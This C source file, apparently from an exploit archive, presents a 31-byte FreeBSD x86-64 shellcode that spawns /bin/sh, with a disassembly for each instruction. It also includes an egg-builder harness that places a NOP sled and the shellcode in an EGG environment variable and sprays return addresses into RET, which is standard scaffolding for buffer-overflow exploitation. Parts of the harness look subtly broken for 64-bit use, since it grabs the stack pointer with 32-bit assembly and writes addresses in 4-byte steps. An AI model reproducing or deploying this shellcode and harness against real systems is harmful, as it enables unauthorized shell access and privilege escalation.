/**
 *           [ http://www.hacknroll.com ]
 *
 * Description:
 *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
 *
 * Authors:
 *    Maycon M. Vitali ( 0ut0fBound )
 *        Milw0rm .: http://www.milw0rm.com/author/869
 *        Page ....: http://maycon.hacknroll.com
 *        Email ...: maycon@hacknroll.com
 *
 *    Anderson Eduardo ( c0d3_z3r0 )
 *        Milw0rm .: http://www.milw0rm.com/author/1570
 *        Page ....: http://anderson.hacknroll.com
 *        Email ...: anderson@hacknroll.com
 * 
 * -------------------------------------------------------
 *   
 * amd64# gcc hacknroll.c -o hacknroll
 * amd64# ./hacknroll
 * # exit
 * amd64#
 *
 * -------------------------------------------------------
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

const char shellcode[] =
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x57"                                       // push   %rdi
        "\x52"                                       // push   %rdx
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05";                                  // syscall

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);


  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);
  putenv(buff);

//  printf(RET);
  system("/bin/bash");
}

